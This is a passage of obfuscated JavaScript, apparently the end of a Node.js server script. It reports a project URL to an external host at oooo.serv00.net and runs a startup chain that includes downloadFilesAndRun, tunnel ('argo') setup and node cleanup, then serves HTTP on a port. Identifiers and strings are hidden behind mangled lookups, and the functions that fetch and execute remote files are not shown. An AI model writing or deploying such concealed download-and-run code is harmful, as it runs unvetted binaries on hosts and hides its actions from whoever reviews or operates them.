_0x25ea5b=_0x1c3f31;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x25ea5b(0x29e)](_0x25ea5b(0x295));return;}try{const _0x51977=await axios[_0x25ea5b(0x2b2)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x25ea5b(0x224)}});return console[_0x25ea5b(0x29e)](_0x25ea5b(0x1f3)),_0x51977;}catch(_0x1e8aa1){return console['error'](_0x25ea5b(0x268)+_0x1e8aa1[_0x25ea5b(0x23c)]),null;}}async function startserver(){const _0x4af94c=_0x1c3f31;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1b4c3e){console[_0x4af94c(0x246)](_0x4af94c(0x257),_0x1b4c3e);}}startserver()[_0x1c3f31(0x210)](_0x47a4cf=>{const _0x310d19=_0x1c3f31;console[_0x310d19(0x246)]('Unhandled\x20error\x20in\x20startserver:',_0x47a4cf);}),app[_0x1c3f31(0x263)](PORT,()=>console[_0x1c3f31(0x29e)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
